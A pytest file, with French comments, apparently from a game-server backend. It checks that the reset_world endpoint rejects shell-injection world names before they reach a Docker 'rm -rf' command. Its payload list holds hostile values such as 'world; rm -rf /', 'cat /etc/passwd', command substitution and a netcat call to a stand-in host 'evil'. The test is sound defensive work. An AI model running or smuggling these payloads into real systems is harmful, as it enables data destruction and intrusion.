"""
Test injection shell-in-container sur reset_world (issue #2).

`world_name` (segment d'URL) est passé à `_docker_exec(..., f"rm -rf /data/{world_name}")`
qui fait `sh -c`. Sans validation stricte, des métacaractères (`;`, espace, `$()`)
seraient interprétés. On vérifie que les payloads malveillants sont rejetés AVANT
tout appel Docker (400), et qu'un nom légitime passe le gate.
"""

import pytest

from backend.game_server.tests.conftest import build_client, OWNER_ID


def _client(user_id=OWNER_ID):
    from backend.game_server import router as gs_router
    holder = {"id": user_id}
    client, _ = build_client(gs_router.router, lambda: holder["id"])
    return client


MALICIOUS = [
    "world; rm -rf /",
    "world && cat /etc/passwd",
    "world$(whoami)",
    "world`id`",
    "world | nc evil 1",
    "world ../../../etc",
    "world/../escape",
    "world name with spaces",
    "world%0Arm -rf /",    # newline URL-encodé (un attaquant ne peut pas envoyer un \n brut)
    "world%0A",            # trailing newline encodé — doit être rejeté ($ vs \Z)
    "notworld",            # ne commence pas par world
    "world&",
]


@pytest.mark.parametrize("name", MALICIOUS)
def test_reset_world_rejects_injection(name):
    client = _client()
    resp = client.delete(f"/api/servers/1/worlds/{name}")
    # 400 (rejet validation) attendu. On accepte aussi 404 si le routage de
    # FastAPI ne matche pas (ex: slash encodé), mais JAMAIS un 500 (= la commande
    # a atteint Docker) ni un 200.
    assert resp.status_code in (400, 404, 422), \
        f"world_name {name!r} should be rejected, got {resp.status_code}: {resp.text}"
    assert resp.status_code not in (200, 500)


LEGIT = ["world", "world_nether", "world-the_end", "world123", "worldNether"]


@pytest.mark.parametrize("name", LEGIT)
def test_reset_world_accepts_legit_names(name):
    client = _client()
    resp = client.delete(f"/api/servers/1/worlds/{name}")
    # Nom valide → passe la validation, atteint Docker (indispo en test → 500).
    # L'important : PAS un 400 de validation.
    assert resp.status_code != 400, f"legit world {name!r} wrongly rejected"
